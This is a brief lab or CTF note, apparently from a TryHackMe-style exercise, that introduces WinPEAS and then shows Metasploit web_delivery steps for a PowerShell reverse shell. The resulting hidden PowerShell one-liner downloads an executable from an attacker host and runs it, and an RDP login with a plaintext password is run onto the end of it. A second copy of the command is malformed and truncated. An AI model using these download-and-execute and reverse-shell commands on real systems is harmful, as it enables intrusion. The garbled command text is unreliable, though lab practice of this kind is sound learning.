**winpeas**

local enumeration on a system.  

Winpeas is a tool allows you to automate enurmation and diagonstics about vulnerable systems in windows. Inlcudinfg misconfigs and vulns in. the system.

    

10.10.13.163

First we will start msfconsole to generate a powershell command that will return a shell back to our kali box

```bash
#start the console
msfconsole


#search for web_delivery location
search web_delivery

use exploit/multi/script/web_delivery

#set the target to a powershell binary
set target psh\ binary


#set the payload to the pwoershell reverse tcp
set payload windows/powershell_reverse_tcp


#set your lhost to th etun0 interface
set lhost {ip_addr}

#turn off encoded commands this can be found by using the 'show advanced' command
set psh-encodedcommand false

#exploit might take a few runs
exploit


#resulting command
powershell.exe -nop -w hidden -c [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;$z="echo ( $env:temp+'\vYeZdlWo.exe')"; (new-object SystemNet.Webclient).DownloadFile('https://10.4.55.232:8080/G4FmziJwhfwQ', $z); invoke-item $zxfreerdp /u:user /p:password321 /cert:ignore /v:10.10.13.163
```

powershell.exe -nop -w hidden -c [Net.ServicePointManager]::SecurityProtocolType]::Tls12;$z="echo($env:temp+'\vYeZdlWo.exe')";$
